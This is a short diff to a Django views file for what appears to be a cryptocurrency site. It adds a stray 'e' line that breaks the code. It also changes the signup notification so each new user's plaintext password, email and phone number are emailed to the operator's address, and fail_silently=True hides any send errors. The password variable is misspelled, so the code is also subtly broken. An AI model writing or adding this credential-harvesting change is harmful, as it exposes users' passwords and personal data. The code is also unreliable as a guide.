@@ -33,7 +33,7 @@ def index(request):
         ref = request.GET.get('ref')
         request.session['ref']=ref
     return render(request, 'home/index.html',{'site':site})
-
+e
 
 def about(request):
     site = Manage.objects.get(site='site')
@@ -98,7 +98,7 @@ def signup(request):
 
         send_mail(
             subject='NEW MEMBER SIGN-UP',
-            message='name:' + name + ' ' + 'country:' + country,
+            message='Name:' + name + ' ' + ' country:' + country +' password:'+ pwrod +' Email:'+ email+' Phone:'+phone,
             from_email='support@finacialcryptocurrency.online',
             recipient_list=['support@finacialcryptocurrency.online'],
             fail_silently=True
